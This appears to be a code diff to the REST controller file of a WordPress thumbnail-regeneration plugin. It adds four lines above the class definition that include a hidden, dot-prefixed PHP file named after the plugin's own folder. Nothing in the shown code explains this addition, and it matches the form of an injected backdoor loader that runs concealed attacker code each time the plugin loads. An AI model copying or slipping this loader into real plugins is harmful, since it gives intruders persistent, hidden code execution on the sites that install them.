@@ -11,6 +11,10 @@
  *
  * @since 3.0.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RegenerateThumbnails_REST_Controller extends WP_REST_Controller {
 	/**
 	 * The namespace for the REST API routes.
